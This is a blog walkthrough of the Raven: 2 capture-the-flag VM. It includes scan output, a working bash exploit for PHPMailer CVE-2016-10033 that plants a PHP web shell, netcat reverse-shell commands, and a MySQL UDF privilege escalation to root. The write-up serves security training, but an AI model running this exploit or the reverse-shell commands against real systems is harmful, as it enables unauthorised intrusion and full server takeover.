---
layout: post
title: "Raven: 2 Walkthrough"
date: 2018-11-20 20:29:18 +0000
last_modified_at: 2018-12-22 17:38:26 +0000
category: Walkthrough
tags: [VulnHub, Raven]
comments: true
image:
  feature: raven-2-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/en/raven-bird-cap-funny-bobble-crow-937263/
---

This post documents the complete walkthrough of Raven: 2, a boot2root [VM][1] created by [William McCann][2], and hosted at [VulnHub][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## Background

Raven 2 is an intermediate level boot2root VM. There are four flags to capture. After multiple breaches, Raven Security has taken extra steps to harden their web server to prevent hackers from getting in. Can you still breach Raven?

## Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
...
PORT      STATE SERVICE REASON         VERSION
22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 26:81:c1:f3:5e:01:ef:93:49:3d:91:1e:ae:8b:3c:fc (DSA)
|   2048 31:58:01:19:4d:a2:80:a6:b9:0d:40:98:1c:97:aa:53 (RSA)
|   256 1f:77:31:19:de:b0:e1:6d:ca:77:07:76:84:d3:a9:a0 (ECDSA)
|_  256 0e:85:71:a8:a2:c3:08:69:9c:91:c0:3f:84:18:df:ae (ED25519)
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Raven Security
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          38372/tcp  status
|_  100024  1          55439/udp  status
38372/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
```

`nmap` finds `22/tcp` and `80/tcp` open. We'll put the rest of the open ports on the back burner.

## Directory/File Enumeration

Let's run through the host with `nikto` and see what we get.

```
# nikto -C all -h 192.168.30.129
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.30.129
+ Target Hostname:    192.168.30.129
+ Target Port:        80
+ Start Time:         2018-11-19 14:17:46 (GMT0)
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 (Debian)
+ Server leaks inodes via ETags, header found with file /, fields: 0x41b3 0x5734482bdcb00
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Apache/2.4.10 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file, which contains sensitive information. Configure Apache to ignore this file or upgrade to a newer version.
+ OSVDB-3233: /icons/README: Apache default file found.
+ Uncommon header 'link' found, with contents: <http://raven.local/wordpress/index.php/wp-json/>; rel="https://api.w.org/"
+ /wordpress/: A Wordpress installation was found.
+ 26165 requests: 0 error(s) and 14 item(s) reported on remote host
+ End Time:           2018-11-19 14:19:11 (GMT0) (85 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

Hmm. Looks like the site is using WordPress to power its blog. Based on my experience, it's best to add `raven.local` to `/etc/hosts`.

Let's run through the site with `gobuster` with one of the bigger directory lists and see what we get.

```
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -u http://raven.local

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://raven.local/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2018/11/19 14:40:47 Starting gobuster
=====================================================
http://raven.local/img (Status: 301)
http://raven.local/css (Status: 301)
http://raven.local/wordpress (Status: 301)
http://raven.local/manual (Status: 301)
http://raven.local/js (Status: 301)
http://raven.local/vendor (Status: 301)
http://raven.local/fonts (Status: 301)
http://raven.local/server-status (Status: 403)
=====================================================
2018/11/19 14:41:19 Finished
=====================================================
```
## Flag: 1

The `/vendor` directory seems interesting. What is it?

<a class="image-popup">
![e584591f.png](/assets/images/posts/raven-2-walkthrough/e584591f.png)
</a>

Notice the date/time of file `PATH` is more recent compared to the rest? Let's take a look at it.

<a class="image-popup">
![10534c10.png](/assets/images/posts/raven-2-walkthrough/10534c10.png)
</a>

That's our first flag.

## PHPMailer < 5.2.18 - Remote Command Execution

Looks like the site is also using PHPMailer 5.2.16.

<a class="image-popup">
![e42e48cf.png](/assets/images/posts/raven-2-walkthrough/e42e48cf.png)
</a>

And it's used here.

<a class="image-popup">
![df07f761.png](/assets/images/posts/raven-2-walkthrough/df07f761.png)
</a>

PHPMailer versions before 5.2.18 is susceptible to remote command execution, as documented in [CVE-2016-10033](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-10033).

To that end, I wrote a `bash` script, using `curl` as the main driver for the exploit.

<div class="filename"><span>exploit.sh</span></div>

```bash
#!/bin/bash

TARGET=http://raven.local/contact.php

DOCROOT=/var/www/html
FILENAME=backdoor.php
LOCATION=$DOCROOT/$FILENAME

STATUS=$(curl -s \
              --data-urlencode "name=Hackerman" \
              --data-urlencode "email=\"hackerman\\\" -oQ/tmp -X$LOCATION blah\"@badguy.com" \
              --data-urlencode "message=<?php echo shell_exec(\$_GET['cmd']); ?>" \
              --data-urlencode "action=submit" \
              $TARGET | sed -r '146!d')

if grep 'instantiate' &>/dev/null <<<"$STATUS"; then
  echo "[+] Check ${LOCATION}?cmd=[shell command, e.g. id]"
else
  echo "[!] Exploit failed"
fi
```

The exploit, once executed, will create a PHP backdoor `backdoor.php` that allows remote command execution. Let's give it a shot.

<a class="image-popup">
![7aa89c20.png](/assets/images/posts/raven-2-walkthrough/7aa89c20.png)
</a>

Awesome.

<a class="image-popup">
![30e1142d.png](/assets/images/posts/raven-2-walkthrough/30e1142d.png)
</a>

We need a better view.

<a class="image-popup">
![3191d7d7.png](/assets/images/posts/raven-2-walkthrough/3191d7d7.png)
</a>

Now, let's see if the beloved `nc` with `-e` option is available.

## Low-Privilege Shell

On our attacking machine, open a terminal and have `nc` listen at `1234/tcp`.

```
# nc -lnvp 1234
```

On the browser's address bar, enter the following command.

<a class="image-popup">
![39cc2368.png](/assets/images/posts/raven-2-walkthrough/39cc2368.png)
</a>

There you have it. A low-privilege shell.

<a class="image-popup">
![9ed3cd88.png](/assets/images/posts/raven-2-walkthrough/9ed3cd88.png)
</a>

## Flag: 2

The second flag is at the home directory of `www-data`.

<a class="image-popup">
![86325e57.png](/assets/images/posts/raven-2-walkthrough/86325e57.png)
</a>

## Flag: 3

The third flag is hidden within WordPress uploads.

<a class="image-popup">
![8fd5778a.png](/assets/images/posts/raven-2-walkthrough/8fd5778a.png)
</a>

Here's how it looks like.

<a class="image-popup">
![c515338b.png](/assets/images/posts/raven-2-walkthrough/c515338b.png)
</a>

## Privilege Escalation

During enumeration of `www-data`'s account, I notice that MySQL is running as `root`. But because this version of MySQL is 5.5, we can't use the popular EDB-ID [1518](https://www.exploit-db.com/exploits/1518/) user-defined function or UDF.

```
root       921  0.0 10.1 552000 51240 ?        Sl   01:02   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=root --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306
```

<a class="image-popup">
![90bbeb4d.png](/assets/images/posts/raven-2-walkthrough/90bbeb4d.png)
</a>

I've also gotten the database credentials from WordPress file `wp-config.php` to log in to MySQL.

<a class="image-popup">
![0e7099ed.png](/assets/images/posts/raven-2-walkthrough/0e7099ed.png)
</a>

No need to fret. There's a GitHub [repository](https://github.com/mysqludf) that hosts many 5.5-compliant UDFs that I can use to finish the dirty deed. I've chosen [lib_mysqludf_sys](https://github.com/mysqludf/lib_mysqludf_sys), a UDF library with functions to interact with the operating system.

According to the instructions, I'll need MySQL development headers which is not available in the target host. Nonetheless, I can still compile the UDF library in my own machine.

On your attacking machine, use the following command to compile `lib_mysqludf_sys`:

```
# gcc -Wall -I/usr/include/mysql -shared -o lib_mysqludf_sys.so lib_mysqludf_sys.c
```

Host the file with Python's `SimpleHTTPServer` module like so.

```
# python -m SimpleHTTPServer 80
```

On the shell, download the UDF library to `/tmp`.

<a class="image-popup">
![d9131786.png](/assets/images/posts/raven-2-walkthrough/d9131786.png)
</a>

Log in to the MySQL database `mysql`.

<a class="image-popup">
![afa49e18.png](/assets/images/posts/raven-2-walkthrough/afa49e18.png)
</a>

First, we need to load the library into a table and then dump it to the MySQL plugins directory `/usr/lib/mysql/plugin` as specified in the command-line shown above.

<a class="image-popup">
![31d47c89.png](/assets/images/posts/raven-2-walkthrough/31d47c89.png)
</a>

Time to create the functions! In fact, we only need to create one function `sys_exec`.

<a class="image-popup">
![5b858fcf.png](/assets/images/posts/raven-2-walkthrough/5b858fcf.png)
</a>

Let's drop a `root` shell. Same thing. We set up a `nc` listener at `4321/tcp` and use the `sys_exec` to execute `nc 192.168.30.128 4321 -e /bin/bash`.

<a class="image-popup">
![ccb45897.png](/assets/images/posts/raven-2-walkthrough/ccb45897.png)
</a>

Meanwhile, at the `nc` listener &hellip;

<a class="image-popup">
![13e83da2.png](/assets/images/posts/raven-2-walkthrough/13e83da2.png)
</a>

Boom.

## Flag: 4

With a `root` shell, getting the final flag is trivial.

<a class="image-popup">
![bef5c602.png](/assets/images/posts/raven-2-walkthrough/bef5c602.png)
</a>

:dancer:

## Afterthought

Good thing I went straight for Raven: 2 first.

[1]: https://www.vulnhub.com/entry/raven-2,269/
[2]: https://twitter.com/@mccannwj
[3]: https://www.vulnhub.com/
